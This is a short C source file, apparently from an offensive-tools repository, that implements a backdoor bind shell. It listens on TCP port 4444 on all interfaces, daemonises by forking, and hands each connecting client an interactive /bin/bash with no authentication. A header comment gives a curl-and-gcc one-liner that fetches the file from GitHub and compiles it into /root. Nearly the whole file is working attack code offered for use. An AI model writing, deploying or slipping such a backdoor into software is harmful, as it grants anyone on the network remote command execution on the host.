//
//  curl -sL https://raw.githubusercontent.com/nipegun/dh-scripts/refs/heads/main/Ataques/BashReversoANetCat.c > /tmp/BashReversoANetCat.c; gcc /tmp/BashReversoANetCat.c -o /root/BashReversoANetCat
//
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <signal.h>
#include <string.h>

int main() {
    int sockfd, clientfd;
    struct sockaddr_in server_addr;
    char *bash_shell[] = {"/bin/bash", "-i", NULL};

    // Crear un socket
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) exit(1);

    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(4444);

    // Enlazar el socket al puerto
    if (bind(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) exit(1);
    if (listen(sockfd, 1) < 0) exit(1);

    // **Fork para mantener el proceso en segundo plano**
    if (fork() != 0) {
        close(sockfd);
        exit(0); // Cierra el proceso padre
    }

    while (1) {
        clientfd = accept(sockfd, NULL, NULL);
        if (clientfd < 0) continue;

        if (fork() == 0) {  // Proceso hijo: ejecuta bash
            dup2(clientfd, STDIN_FILENO);
            dup2(clientfd, STDOUT_FILENO);
            dup2(clientfd, STDERR_FILENO);
            close(sockfd);
            execve("/bin/bash", bash_shell, NULL);
            exit(0);
        }

        close(clientfd);
    }

    close(sockfd);
    return 0;
}
